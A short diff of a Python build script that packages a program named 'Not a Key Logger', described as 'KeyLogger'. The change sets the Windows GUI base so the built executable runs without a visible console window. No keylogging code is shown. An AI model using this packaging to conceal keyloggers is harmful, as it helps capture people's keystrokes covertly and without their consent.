@@ -6,5 +6,5 @@ setup(name ='Not a Key Logger',
         'include_msvcr': True,
       }},
       description = 'KeyLogger',
-      executables = [Executable('main.py')]
+      executables = [Executable('main.py', base='Win32GUI')],
       )
